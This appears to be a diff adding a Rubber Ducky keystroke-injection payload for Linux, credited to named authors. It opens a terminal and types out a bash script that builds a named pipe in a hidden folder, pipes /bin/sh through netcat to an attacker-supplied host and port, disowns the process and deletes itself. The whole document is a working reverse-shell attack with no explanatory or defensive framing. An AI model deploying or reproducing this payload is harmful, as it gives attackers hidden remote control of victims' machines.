@@ -1,0 +1,28 @@
+REM Author: tuzzmaniandevil, Ported to Ducky By ThoughtfulDev
+DELAY 5000
+CTRL-ALT t
+DELAY 2000
+STRING echo '#!/bin/bash' >> a.sh
+ENTER
+STRING echo 'A="$0"' >> a.sh
+ENTER
+STRING echo 'H=$1' >> a.sh
+ENTER
+STRING echo 'P=$2' >> a.sh
+ENTER
+STRING echo 'rm -rf ~/.a/' >> a.sh
+ENTER
+STRING echo 'mkdir -p ~/.a/' >> a.sh
+ENTER
+STRING echo 'mknod ~/.a/p p' >> a.sh
+ENTER
+STRING echo '/bin/sh -c /bin/sh 0<~/.a/p | nc $H $P 1>~/.a/p &' >> a.sh
+ENTER
+STRING echo 'disown $!' >> a.sh
+ENTER
+STRING echo 'rm -f "$A"' >> a.sh
+ENTER
+STRING chmod +x a.sh && ./a.sh <host> <port>
+ENTER
+STRING exit
+ENTER
